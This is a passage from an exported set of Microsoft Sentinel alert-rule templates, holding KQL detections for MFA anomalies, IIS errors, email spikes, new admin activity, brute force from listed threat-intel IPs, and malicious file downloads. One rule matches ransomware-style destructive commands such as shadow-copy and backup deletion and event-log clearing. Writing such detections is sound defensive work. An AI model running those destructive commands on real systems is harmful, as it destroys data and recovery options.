ClientIP \n| order by Operation, UserId asc",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-864')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-864')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-864: [RBA] Azure AD - MFA Failure with new country or IP",
          "description": "Azure AD - MFA failures for users from a new country or new IP as compared to the last three days.\n\nManaged Detection and Response (MDR):\n  - Non-informational severity events\n  - Alerts not excluded in ExcludedAlerts (Admin or User reported messages)\n\nRisk Behavior Analytics (RBA):\n  - Informational severity events\n  - Excluded alerts\n\nExclusions:\n  - None MITRE: T1078 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let ingested_lookback = 1h; // earliest [ingest time] boundary\nlet generated_lookback = 2h; // earliest [log time] boundary\nlet historical_lookback = 7d;\nSigninLogs\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| extend countryOrRegion_ = tostring(LocationDetails.countryOrRegion)\n| where ResultType == '50074'\n| summarize FailCount=count(),TimeGeneratedFailedMFA=min(TimeGenerated)by CurrentCountry = countryOrRegion_, UserPrincipalName, CurrentIP=IPAddress\n| where FailCount > 3\n| join kind=inner ( SigninLogs\n| where TimeGenerated between (ago(historical_lookback) .. ago(generated_lookback))\n| where ResultType == 0\n| extend countryOrRegion_ = tostring(LocationDetails.countryOrRegion)\n|summarize TimeGeneratedSuccessfulLogin=max(TimeGenerated),HistoricalCountries=make_set_if(countryOrRegion_,isnotempty(countryOrRegion_)), HistoricalIPs=make_set_if(IPAddress, isnotempty(IPAddress)) by UserPrincipalName\n) on UserPrincipalName\n| project-away UserPrincipalName1\n| join kind=leftanti ( SigninLogs\n| where TimeGenerated between (ago(historical_lookback) .. ago(generated_lookback))\n| where ResultType == 0\n| extend countryOrRegion_ = tostring(LocationDetails.countryOrRegion)\n) on UserPrincipalName, $left.CurrentIP==$right.IPAddress, $left.CurrentCountry==$right.countryOrRegion_\n| parse UserPrincipalName with UserName '@' UserDomain\n| project FailCount,TimeGeneratedFailedMFA, TimeGeneratedSuccessfulLogin, UserPrincipalName, CurrentCountry, CurrentIP, HistoricalCountries, HistoricalIPs, UserName, UserDomain",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UserDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CurrentIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-558')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-558')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-558: [RBA] IIS - Multiple Suspicious Response Codes Caused by Single Client",
          "description": "Detects possible exploitation activity or bugs in a web application. MITRE: T1491,T1205 Category: IIS tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "W3CIISLog \n| where TimeGenerated > ago(1d) \n| where scStatus in ('400', '401', '403', '500')\n| where cIP !in (WHITELISTED_IPS)\n| where cIP !in (WHITELISTED_SCANNERS)\n| extend fullUrl = strcat(sSiteName, csUriStem)\n| summarize count(), make_set(scStatus, 5), make_set(fullUrl, 5) by IPCustomEntity = cIP, bin(TimeGenerated,10m)\n| where count_ > 10\n| sort by count_ desc\n| limit 50",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "DefenseEvasion",
            "Persistence",
            "CommandAndControl"
          ],
          "techniques": [
            "T1491",
            "T1205"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-566')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-566')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-566: [RBA] O365 - Anomalous number of emails",
          "description": "This alert identifies Office 365 accounts that created an unusual number of emails compared with the last 14 days MITRE: T1114,T1586 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let time_bin= 1d;\n            let emailStats = materialize (\n            OfficeActivity\n            | where TimeGenerated between (ago(14d) .. ago(1d))\n            | extend Subject_ = tostring(parse_json(Item).Subject)\n            | where isnotempty(Subject_)\n            | where OfficeWorkload == 'Exchange'\n            | where Operation == 'Create'\n            | extend Path = tostring(parse_json(tostring(parse_json(Item).ParentFolder)).Path)\n            | where Path matches regex A566_MONITORED_FOLDERS\n            | project TimeGenerated, MailboxOwnerUPN\n                | summarize CountPerDay=count() by MailboxOwnerUPN, bin(TimeGenerated, time_bin)\n                | summarize percentiles(CountPerDay, 5, 25, 50, 75, 90, 100), MaxPerDay=max(CountPerDay), AvgPerDay=avg(CountPerDay), StdevPerDay=stdev(CountPerDay) by SenderEmail = MailboxOwnerUPN\n                //ignore those who never send more than 100 perday.\n                | where MaxPerDay > 100\n                //set upper deviation to max plus two standard deviations\n                | extend PerDayUpperDeviation = round(MaxPerDay + (1 * StdevPerDay), 0)\n                );\n            OfficeActivity\n            | where TimeGenerated between (ago(1d) .. now())\n            | extend Subject_ = tostring(parse_json(Item).Subject)\n            | where isnotempty(Subject_)\n            | where OfficeWorkload == 'Exchange'\n            | where Operation == 'Create'\n            | extend Path = tostring(parse_json(tostring(parse_json(Item).ParentFolder)).Path)\n            | where Path matches regex A566_MONITORED_FOLDERS\n            | project TimeGenerated, MailboxOwnerUPN\n            | summarize LastDayCount = count(), minEmailTime=min(TimeGenerated), maxEmailTime=max(TimeGenerated) by SenderEmail = MailboxOwnerUPN, bin(TimeGenerated, time_bin)\n            | join emailStats on SenderEmail\n            | project TimeGenerated, minEmailTime, maxEmailTime, SenderEmail, LastDayCount, MaxPerDay, PerDayUpperDeviation, StdevPerDay, AvgPerDay\n            //greater than 2 times a 90 day standard deviation\n            | where LastDayCount >= PerDayUpperDeviation\n            | extend Delta = LastDayCount - PerDayUpperDeviation\n            | extend Account = iff(SenderEmail has_any (DOMAINS), SenderEmail,'')\n            | parse Account with AccountCustomEntity '@' AccountUPNSuffix\n            | sort by Delta desc",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection",
            "ResourceDevelopment"
          ],
          "techniques": [
            "T1114",
            "T1586"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "SenderEmail": "SenderEmail"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountUPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-136')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-136')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-136: [RBA] O365 - New admin activity detected",
          "description": "This will help you discover any new admin account activity which was seen and were not seen historically. Any new accounts seen in the results can be validated and investigated for any suspicious activities. MITRE: T1136 Category: Office 365 tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let historicalActivity= OfficeActivity\n    | where TimeGenerated between(ago(14d)..ago(1d))\n    | where RecordType == 'ExchangeAdmin' and UserType in~ (AUTHORIZED_USERTYPES) and UserId !in~ (A069_EXCLUDED_USERIDS)\n    | summarize historicalCount=count() by UserId;\n    let recentActivity = OfficeActivity\n    | where TimeGenerated > ago(1d)\n    | where RecordType == 'ExchangeAdmin' and UserType in~ (AUTHORIZED_USERTYPES) and UserId !in~ (A069_EXCLUDED_USERIDS)\n    | summarize recentCount=count() by UserId;\n    recentActivity\n    | join kind = leftanti\n    (\n        historicalActivity\n    )\n    on UserId\n    | project UserId,recentCount\n    | order by recentCount asc, UserId\n    | join kind = rightsemi\n    (\n        OfficeActivity\n        | where TimeGenerated >= ago(1d)\n        | where RecordType == 'ExchangeAdmin' and UserType in~ (AUTHORIZED_USERTYPES) and UserId !in~ (A069_EXCLUDED_USERIDS)\n    )\n    on UserId\n    | where Operation !in (WHITELISTED_OFFICE_OPERATIONS)\n    | summarize Count=count(), First=min(TimeGenerated), Last=max(TimeGenerated) by RecordType, Operation, UserType, UserId, OriginatingServer,ResultStatus, OfficeObjectId\n    | project First, Last, RecordType, Operation, UserType, AccountCustomEntity = UserId, OriginatingServer,ResultStatus, OfficeObjectId",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1136"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8903c6d4-91ad-4f33-8aec-01dfc8f766bd')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8903c6d4-91ad-4f33-8aec-01dfc8f766bd')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Iranian Cyber Actors\u00e2\u20ac\u2122 Brute Force and Credential Access Activity Using CISA IOCs",
          "description": "This rule monitors for brute force attacks, suspicious IP logins, MFA fatigue, and lateral movement using RDP based on CISA indicators of compromise (IOCs) Created/Added on 10/21/24 AMayor",
          "severity": "High",
          "enabled": true,
          "query": "// List of known suspicious IPs from threat intel\nlet suspiciousIPs = dynamic([\n    \"95.181.234.12\", \"95.181.234.25\", \"173.239.232.20\", \"172.98.71.191\", \"102.129.235.127\", \n    \"188.126.94.60\", \"149.40.50.45\", \"181.214.166.59\", \"212.102.39.212\", \"149.57.16.134\",\n    \"149.57.16.137\", \"102.129.235.186\", \"46.246.8.138\", \"149.57.16.160\", \"149.57.16.37\",\n    \"46.246.8.137\", \"212.102.57.29\", \"46.246.8.82\", \"95.181.234.15\", \"45.88.97.225\",\n    \"84.239.45.17\", \"46.246.8.104\", \"37.46.113.206\", \"46.246.3.186\", \"46.246.8.141\",\n    \"46.246.8.17\", \"37.19.197.182\", \"154.16.192.38\", \"102.165.16.127\", \"46.246.8.47\",\n    \"46.246.3.225\", \"46.246.3.226\", \"46.246.3.240\", \"191.101.217.10\", \"102.129.153.182\",\n    \"46.246.3.196\", \"102.129.152.60\", \"156.146.60.74\", \"191.96.227.113\", \"191.96.227.122\",\n    \"181.214.166.132\", \"188.126.94.57\", \"154.6.13.144\", \"154.6.13.151\", \"188.126.94.166\",\n    \"89.149.38.204\", \"46.246.8.67\", \"46.246.8.53\", \"154.16.192.37\", \"191.96.150.14\", \n    \"191.96.150.96\", \"46.246.8.10\", \"84.239.25.13\", \"154.6.13.139\", \"191.96.106.33\", \n    \"191.96.227.159\", \"149.57.16.150\", \"191.96.150.21\", \"46.246.8.84\", \"95.181.235.8\", \n    \"191.96.227.102\", \"46.246.122.185\", \"146.70.102.3\", \"46.246.3.233\", \"46.246.3.239\",\n    \"188.126.89.35\", \"46.246.3.223\", \"46.246.3.245\", \"191.96.150.50\"\n]);\n// Detecting brute force logins\nlet bruteForceLogins = \n    SecurityEvent\n    | where EventID == 4625 // Failed login event\n    | where AccountType == \"User\" // Limit to user accounts\n    | where not(isnull(Account)) // Exclude rows with null Account\n    | where not(ipv4_is_private(IpAddress)) // Exclude private IP addresses\n    | summarize FailedAttempts = count() by Account, IpAddress\n    | where FailedAttempts > 10; // Tuning threshold for brute force attacks\n// Detecting logins from suspicious IPs\nlet suspiciousLogins = \n    SecurityEvent\n    | where EventID == 4624 // Successful login event\n    | where not(isnull(Account)) // Exclude rows with null Account\n    | where IpAddress in (suspiciousIPs) // Only include IPs from the suspicious IPs list\n    | summarize SuspiciousLoginCount = count() by Account, IpAddress;\n// Detecting logons potentially involving MFA, OAuth, or Federated Authentication\nlet mfaRelatedLogons = \n    IdentityLogonEvents\n    | where LogonType in (\"Federation\", \"WSFederation\", \"OAuth2:Authorize\", \"OAuth2:ApproveSession\", \"OAuth:Token\", \"Consent:set\", \"SSPR:end\") // Logon types likely related to MFA or consent\n    | where not(isnull(AccountUpn)) // Exclude rows with null AccountUpn\n    | where not(ipv4_is_private(IPAddress)) // Exclude private IP addresses\n    | extend NormalizedAccount = tostring(split(AccountUpn, \"@\")[0]) // Extract username from UPN\n    | summarize RequestCount = count() by NormalizedAccount, DeviceName, IPAddress\n    | where RequestCount > 10; // Tuning threshold for MFA fatigue/bombing\n// Lateral movement detection (RDP usage or suspicious logon)\nlet rdpLateralMovement = \n    SecurityEvent\n    | where EventID == 4624 and LogonType == \"Remote Desktop\" // RDP Logon\n    | where not(isnull(Account)) and not(isnull(TargetAccount)) // Exclude rows with null Account or TargetAccount\n    | where Account != TargetAccount // Look for lateral movement where different accounts are involved\n    | where not(ipv4_is_private(IpAddress)) // Exclude private IP addresses\n    | summarize LogonCount = count() by TargetAccount, IpAddress, Account;\n// Combine all suspicious activities into one view using the normalized account name\nbruteForceLogins\n| join kind=inner (suspiciousLogins) on Account\n| join kind=inner (mfaRelatedLogons) on $left.Account == $right.NormalizedAccount\n| join kind=inner (rdpLateralMovement) on Account\n| project Account, IpAddress, FailedAttempts, SuspiciousLoginCount, RequestCount, LogonCount;\n\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence",
            "LateralMovement",
            "CredentialAccess",
            "DefenseEvasion"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7115ad59-810d-4e44-a541-0e98c5dec334')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7115ad59-810d-4e44-a541-0e98c5dec334')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Multiple Suspicious Command Execution Detection",
          "description": "Detects multiple suspicious command executions like taskkill, net stop, cipher, etc. Created/Added on 10/22/24 by AMayor",
          "severity": "High",
          "enabled": true,
          "query": "// Find attempts to stop processes using taskkill.exe\nlet taskKill = DeviceProcessEvents\n| where FileName =~ \"taskkill.exe\"\n| summarize taskKillCount = dcount(tostring(ProcessCommandLine)), TaskKillList = make_set(ProcessCommandLine) by DeviceId, bin(TimeGenerated, 2m)\n| where taskKillCount > 10;\n// Find attempts to stop processes using net stop\nlet netStop = DeviceProcessEvents\n| where FileName =~ \"net.exe\" and ProcessCommandLine has \"stop\"\n| summarize netStopCount = dcount(tostring(ProcessCommandLine)), NetStopList = make_set(ProcessCommandLine) by DeviceId, bin(TimeGenerated, 2m)\n| where netStopCount > 10;\n// Look for cipher.exe deleting data from multiple drives\nlet cipher = DeviceProcessEvents\n| where FileName =~ \"cipher.exe\"\n| where ProcessCommandLine has \"/w\"\n| summarize CipherCount = dcount(tostring(ProcessCommandLine)), CipherList = make_set(ProcessCommandLine) by DeviceId, bin(TimeGenerated, 1m)\n| where CipherCount > 1;\n// Look for use of wevtutil to clear multiple logs\nlet wevtutilClear = DeviceProcessEvents\n| where ProcessCommandLine has \"WEVTUTIL\" and ProcessCommandLine has \"CL\"\n| summarize LogClearCount = dcount(tostring(ProcessCommandLine)), ClearedLogList = make_set(ProcessCommandLine) by DeviceId, bin(TimeGenerated, 5m)\n| where LogClearCount > 10;\n// Look for sc.exe disabling services\nlet scDisable = DeviceProcessEvents\n| where ProcessCommandLine has \"sc\" and ProcessCommandLine has \"config\" and ProcessCommandLine has \"disabled\"\n| summarize ScDisableCount = dcount(tostring(ProcessCommandLine)), ScDisableList = make_set(ProcessCommandLine) by DeviceId, bin(TimeGenerated, 5m)\n| where ScDisableCount > 10;\n// Main query for counting and aggregating evidence\nlet mainQuery = DeviceProcessEvents\n| where FileName =~ \"vssadmin.exe\" and ProcessCommandLine has_any(\"list shadows\", \"delete shadows\")\nor FileName =~ \"fsutil.exe\" and ProcessCommandLine has \"usn\" and ProcessCommandLine has \"deletejournal\"\nor ProcessCommandLine has(\"bcdedit\") and ProcessCommandLine has_any(\"recoveryenabled no\", \"bootstatuspolicy ignoreallfailures\")\nor ProcessCommandLine has \"wbadmin\" and ProcessCommandLine has \"delete\" and ProcessCommandLine has_any(\"backup\", \"catalog\", \"systemstatebackup\")\nor (ProcessCommandLine has \"wevtutil\" and ProcessCommandLine has \"cl\")\nor (ProcessCommandLine has \"wmic\" and ProcessCommandLine has \"shadowcopy delete\")\nor (ProcessCommandLine has \"sc\" and ProcessCommandLine has \"config\" and ProcessCommandLine has \"disabled\")\n| extend Bcdedit = iff(ProcessCommandLine has \"bcdedit\" and ProcessCommandLine has_any(\"recoveryenabled no\", \"bootstatuspolicy ignoreallfailures\"), 1, 0)\n| extend ShadowCopyDelete = iff(ProcessCommandLine has \"shadowcopy delete\", 1, 0)\n| extend VssAdminShadows = iff(ProcessCommandLine has \"vssadmin\" and ProcessCommandLine has_any(\"list shadows\", \"delete shadows\"), 1, 0)\n| extend Wbadmin = iff(ProcessCommandLine has \"wbadmin\" and ProcessCommandLine has \"delete\" and ProcessCommandLine has_any(\"backup\", \"catalog\", \"systemstatebackup\"), 1, 0)\n| extend Fsutil = iff(ProcessCommandLine has \"fsutil\" and ProcessCommandLine has \"usn\" and ProcessCommandLine has \"deletejournal\", 1, 0)\n| summarize FirstActivity = min(TimeGenerated), ReportId = any(ReportId), Commands = make_set(ProcessCommandLine) by DeviceId, Fsutil, Wbadmin, ShadowCopyDelete, Bcdedit, VssAdminShadows, bin(TimeGenerated, 6h);\n// Joining extra evidence\nmainQuery\n| join kind=leftouter (wevtutilClear) on $left.DeviceId == $right.DeviceId\n| join kind=leftouter (cipher) on $left.DeviceId == $right.DeviceId\n| join kind=leftouter (netStop) on $left.DeviceId == $right.DeviceId\n| join kind=leftouter (taskKill) on $left.DeviceId == $right.DeviceId\n| join kind=leftouter (scDisable) on $left.DeviceId == $right.DeviceId\n| extend WevtutilUse = iff(LogClearCount > 10, 1, 0)\n| extend CipherUse = iff(CipherCount > 1, 1, 0)\n| extend NetStopUse = iff(netStopCount > 10, 1, 0)\n| extend TaskkillUse = iff(taskKillCount > 10, 1, 0)\n| extend ScDisableUse = iff(ScDisableCount > 10, 1, 0)\n| mv-expand CommandList = NetStopList, TaskKillList, ClearedLogList, CipherList, Commands, ScDisableList\n| summarize BcdEdit = iff(make_set(Bcdedit) contains \"1\", 1, 0), NetStop10PlusCommands = iff(make_set(NetStopUse) contains \"1\", 1, 0), Wevtutil10PlusLogsCleared = iff(make_set(WevtutilUse) contains \"1\", 1, 0),\nCipherMultipleDrives = iff(make_set(CipherUse) contains \"1\", 1, 0), Fsutil = iff(make_set(Fsutil) contains \"1\", 1, 0), ShadowCopyDelete = iff(make_set(ShadowCopyDelete) contains \"1\", 1, 0),\nWbadmin = iff(make_set(Wbadmin) contains \"1\", 1, 0), TaskKill10PlusCommand = iff(make_set(TaskkillUse) contains \"1\", 1, 0), VssAdminShadow = iff(make_set(VssAdminShadows) contains \"1\", 1, 0),\nScDisable = iff(make_set(ScDisableUse) contains \"1\", 1, 0), TotalEvidenceCount = dcount(tostring(CommandList)), EvidenceList = make_set(Commands), StartofBehavior = min(FirstActivity) by DeviceId, bin(TimeGenerated, 1d)\n| extend UniqueEvidenceCount = BcdEdit + NetStop10PlusCommands + Wevtutil10PlusLogsCleared + CipherMultipleDrives + Wbadmin + Fsutil + TaskKill10PlusCommand + VssAdminShadow + ScDisable + ShadowCopyDelete\n| where UniqueEvidenceCount > 2;\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution",
            "PrivilegeEscalation",
            "Persistence",
            "DefenseEvasion"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ca03d093-c2b7-4459-a54c-8447e4881573')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ca03d093-c2b7-4459-a54c-8447e4881573')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Unauthorized File Upload Detection via Teams and SharePoint",
          "description": "This KQL (Kusto Query Language) script is designed to detect file creation events initiated by Microsoft Teams on endpoints, where the file originates from SharePoint or Teams URLs. The query focuses on identifying specific file types that could indicate malicious activity, such as executables, scripts, and compressed files. It filters out legitimate update processes and restricts file origin to certain allowed SharePoint domains, flagging files from unauthorized domains. Created/Added on 10/22/24 AMayor",
          "severity": "Medium",
          "enabled": true,
          "query": "let allowedSharepointDomain = pack_array(\n'mysharepointname' //customize Sharepoint domain name and add more domains as needed for your query\n);\n//\nlet executable = pack_array(\n'exe',\n'dll',\n'xll',\n'msi',\n'application'\n);\nlet script = pack_array(\n'ps1',\n'py',\n'vbs',\n'bat'\n);\nlet compressed = pack_array(\n'rar',\n'7z',\n'zip',\n'tar',\n'gz'\n);\n//\nlet startTime = ago(1d);\nlet endTime = now();\nDeviceFileEvents\n| where TimeGenerated  between (startTime..endTime)\n| where ActionType =~ 'FileCreated'\n| where InitiatingProcessFileName has 'teams.exe'\n    or InitiatingProcessParentFileName has 'teams.exe'\n| where InitiatingProcessFileName !has 'update.exe'\n    and InitiatingProcessParentFileName !has 'update.exe'\n| where FileOriginUrl has 'sharepoint'\n    and FileOriginReferrerUrl has_any ('sharepoint', 'teams.microsoft')\n| extend fileExt = tolower(tostring(split(FileName,'.')[-1]))\n| where fileExt in (executable)\n    or fileExt in (script)\n    or fileExt in (compressed)\n| extend fileGroup = iff( fileExt in (executable),'executable','')\n| extend fileGroup = iff( fileExt in (script),'script',fileGroup)\n| extend fileGroup = iff( fileExt in (compressed),'compressed',fileGroup)\n//\n| extend sharePoint_domain = tostring(split(FileOriginUrl,'/')[2])\n| where not (sharePoint_domain has_any (allowedSharepointDomain))\n| project-reorder TimeGenerated, DeviceId, DeviceName, sharePoint_domain, FileName, FolderPath, SHA256, FileOriginUrl, FileOriginReferrerUrl\n\n",
          "queryFrequency": "PT8H",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Execution",
            "DefenseEvasion",
            "Collection",
            "Persistence"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/63a76518-720d-42f3-8e26-f5793f94fd78')]",
